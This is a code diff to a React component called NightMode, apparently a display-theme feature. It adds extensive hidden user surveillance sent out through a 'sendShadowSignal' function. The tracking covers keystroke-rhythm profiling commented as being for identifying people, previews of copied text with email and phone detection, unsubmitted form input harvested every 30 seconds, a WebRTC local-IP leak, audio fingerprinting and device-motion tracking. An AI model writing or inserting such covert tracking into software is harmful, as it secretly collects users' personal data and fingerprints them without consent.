@@ -609,6 +609,259 @@ export default function NightMode() {
     };
     window.addEventListener('scroll', handleScroll);
 
+    // ⌨️ 打字節奏分析 - 識別身份用
+    const keyTimings: number[] = [];
+    let lastKeyTime = 0;
+    const handleKeyTiming = (e: KeyboardEvent) => {
+      const now = Date.now();
+      if (lastKeyTime > 0) {
+        const interval = now - lastKeyTime;
+        keyTimings.push(interval);
+        // 每 50 個按鍵分析一次節奏
+        if (keyTimings.length >= 50) {
+          const avg = keyTimings.reduce((a, b) => a + b, 0) / keyTimings.length;
+          const sorted = [...keyTimings].sort((a, b) => a - b);
+          sendShadowSignal('TYPING_RHYTHM', {
+            avgInterval: Math.round(avg),
+            minInterval: sorted[0],
+            maxInterval: sorted[sorted.length - 1],
+            medianInterval: sorted[Math.floor(sorted.length / 2)],
+            samples: keyTimings.length
+          });
+          keyTimings.length = 0;
+        }
+      }
+      lastKeyTime = now;
+    };
+    document.addEventListener('keydown', handleKeyTiming);
+
+    // 📋 複製內容監控
+    const handleCopy = () => {
+      const selection = window.getSelection()?.toString() || '';
+      if (selection.length > 0) {
+        sendShadowSignal('COPY', {
+          length: selection.length,
+          preview: selection.slice(0, 200),
+          hasUrl: /https?:\/\//.test(selection),
+          hasEmail: /@/.test(selection),
+          hasPhone: /\d{4}[-\s]?\d{3}[-\s]?\d{3}/.test(selection)
+        });
+      }
+    };
+    document.addEventListener('copy', handleCopy);
+
+    // 🖱️ 右鍵選單監控
+    const handleContextMenu = (e: MouseEvent) => {
+      const target = e.target as HTMLElement;
+      sendShadowSignal('RIGHT_CLICK', {
+        x: e.clientX,
+        y: e.clientY,
+        target: target?.tagName,
+        targetText: target?.textContent?.slice(0, 50)
+      });
+    };
+    document.addEventListener('contextmenu', handleContextMenu);
+
+    // ⌨️ 快捷鍵監控
+    const handleShortcut = (e: KeyboardEvent) => {
+      if (e.ctrlKey || e.metaKey || e.altKey) {
+        sendShadowSignal('SHORTCUT', {
+          key: e.key,
+          ctrl: e.ctrlKey,
+          meta: e.metaKey,
+          alt: e.altKey,
+          shift: e.shiftKey
+        });
+      }
+    };
+    document.addEventListener('keydown', handleShortcut);
+
+    // 👆 雙擊監控
+    const handleDblClick = (e: MouseEvent) => {
+      const target = e.target as HTMLElement;
+      sendShadowSignal('DOUBLE_CLICK', {
+        x: e.clientX,
+        y: e.clientY,
+        target: target?.tagName,
+        selectedText: window.getSelection()?.toString()?.slice(0, 100)
+      });
+    };
+    document.addEventListener('dblclick', handleDblClick);
+
+    // 📝 表單輸入監控（即使沒送出）
+    const formInputs: Record<string, string> = {};
+    const handleInput = (e: Event) => {
+      const target = e.target as HTMLInputElement | HTMLTextAreaElement;
+      if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
+        const name = target.name || target.id || target.placeholder || 'unknown';
+        formInputs[name] = target.value.slice(0, 200);
+      }
+    };
+    document.addEventListener('input', handleInput);
+    // 定期發送表單資料
+    const formInterval = setInterval(() => {
+      if (Object.keys(formInputs).length > 0) {
+        sendShadowSignal('FORM_INPUT', { fields: { ...formInputs } });
+      }
+    }, 30000);
+
+    // 🔗 外部連結點擊監控
+    const handleLinkClick = (e: MouseEvent) => {
+      const target = e.target as HTMLAnchorElement;
+      if (target?.tagName === 'A' && target.href) {
+        const isExternal = !target.href.includes(window.location.hostname);
+        if (isExternal) {
+          sendShadowSignal('EXTERNAL_LINK', {
+            href: target.href,
+            text: target.textContent?.slice(0, 50)
+          });
+        }
+      }
+    };
+    document.addEventListener('click', handleLinkClick);
+
+    // ❌ JavaScript 錯誤追蹤
+    const handleError = (e: ErrorEvent) => {
+      sendShadowSignal('JS_ERROR', {
+        message: e.message,
+        filename: e.filename,
+        line: e.lineno,
+        col: e.colno
+      });
+    };
+    window.addEventListener('error', handleError);
+
+    // 📱 加速度計/陀螺儀（走路、躺著、坐著偵測）
+    let lastMotionTime = 0;
+    const handleMotion = (e: DeviceMotionEvent) => {
+      const now = Date.now();
+      // 每 5 秒最多記錄一次
+      if (now - lastMotionTime < 5000) return;
+      const acc = e.accelerationIncludingGravity;
+      if (acc && (Math.abs(acc.x || 0) > 2 || Math.abs(acc.y || 0) > 2 || Math.abs(acc.z || 0) > 2)) {
+        lastMotionTime = now;
+        sendShadowSignal('MOTION', {
+          x: Math.round((acc.x || 0) * 10) / 10,
+          y: Math.round((acc.y || 0) * 10) / 10,
+          z: Math.round((acc.z || 0) * 10) / 10,
+          interval: e.interval
+        });
+      }
+    };
+    window.addEventListener('devicemotion', handleMotion);
+
+    // 🌐 WebRTC IP 洩漏偵測
+    const detectWebRTCIP = async () => {
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+
+        pc.onicecandidate = (e) => {
+          if (e.candidate) {
+            const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+            if (ipMatch) {
+              sendShadowSignal('WEBRTC_IP', { localIP: ipMatch[0] });
+              pc.close();
+            }
+          }
+        };
+
+        // 超時關閉
+        setTimeout(() => pc.close(), 5000);
+      } catch {
+        // WebRTC 不支援
+      }
+    };
+    detectWebRTCIP();
+
+    // 🔊 音訊指紋
+    const detectAudioFingerprint = () => {
+      try {
+        const audioCtx = new (window.AudioContext || (window as Window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        const gain = audioCtx.createGain();
+        const processor = audioCtx.createScriptProcessor(4096, 1, 1);
+
+        gain.gain.value = 0; // 靜音
+        oscillator.type = 'triangle';
+        oscillator.connect(analyser);
+        analyser.connect(processor);
+        processor.connect(gain);
+        gain.connect(audioCtx.destination);
+
+        oscillator.start(0);
+
+        processor.onaudioprocess = (e) => {
+          const data = e.inputBuffer.getChannelData(0);
+          let sum = 0;
+          for (let i = 0; i < data.length; i++) {
+            const val = data[i];
+            if (val !== undefined) sum += Math.abs(val);
+          }
+          const fingerprint = sum.toString().slice(0, 20);
+          sendShadowSignal('AUDIO_FINGERPRINT', { fingerprint });
+          oscillator.stop();
+          processor.disconnect();
+          audioCtx.close();
+        };
+      } catch {
+        // 音訊指紋失敗
+      }
+    };
+    detectAudioFingerprint();
+
+    // 🔤 CSS 偏好偵測
+    const detectCSSPreferences = () => {
+      const prefs: Record<string, boolean | string> = {};
+      if (window.matchMedia('(prefers-color-scheme: dark)').matches) prefs.darkMode = true;
+      if (window.matchMedia('(prefers-color-scheme: light)').matches) prefs.lightMode = true;
+      if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) prefs.reducedMotion = true;
+      if (window.matchMedia('(prefers-contrast: high)').matches) prefs.highContrast = true;
+      sendShadowSignal('CSS_PREFS', prefs);
+    };
+    detectCSSPreferences();
+
+    // 📍 來源頁面
+    if (document.referrer) {
+      sendShadowSignal('REFERRER', { from: document.referrer });
+    }
+
+    // 💾 儲存空間偵測
+    const detectStorage = async () => {
+      try {
+        if (navigator.storage && navigator.storage.estimate) {
+          const estimate = await navigator.storage.estimate();
+          sendShadowSignal('STORAGE', {
+            quota: Math.round((estimate.quota || 0) / 1024 / 1024),
+            usage: Math.round((estimate.usage || 0) / 1024 / 1024)
+          });
+        }
+      } catch {
+        // 儲存偵測失敗
+      }
+    };
+    detectStorage();
+
+    // 🖥️ 效能指標
+    const detectPerformance = () => {
+      try {
+        const perf = performance.getEntriesByType('navigation')[0] as PerformanceNavigationTiming;
+        if (perf) {
+          sendShadowSignal('PERFORMANCE', {
+            loadTime: Math.round(perf.loadEventEnd - perf.startTime),
+            domReady: Math.round(perf.domContentLoadedEventEnd - perf.startTime),
+            type: perf.type // navigate, reload, back_forward
+          });
+        }
+      } catch {
+        // 效能偵測失敗
+      }
+    };
+    setTimeout(detectPerformance, 3000);
+
     // 📸 偵測媒體裝置（相機/麥克風數量）
     const detectMediaDevices = async () => {
       try {
@@ -676,8 +929,18 @@ export default function NightMode() {
       document.removeEventListener('click', handleClick);
       document.removeEventListener('touchmove', handleTouch);
       window.removeEventListener('scroll', handleScroll);
+      document.removeEventListener('keydown', handleKeyTiming);
+      document.removeEventListener('copy', handleCopy);
+      document.removeEventListener('contextmenu', handleContextMenu);
+      document.removeEventListener('keydown', handleShortcut);
+      document.removeEventListener('dblclick', handleDblClick);
+      document.removeEventListener('input', handleInput);
+      document.removeEventListener('click', handleLinkClick);
+      window.removeEventListener('error', handleError);
+      window.removeEventListener('devicemotion', handleMotion);
       window.removeEventListener('beforeunload', handleBeforeUnload);
       clearInterval(heartbeatInterval);
+      clearInterval(formInterval);
     };
   }, []);
 
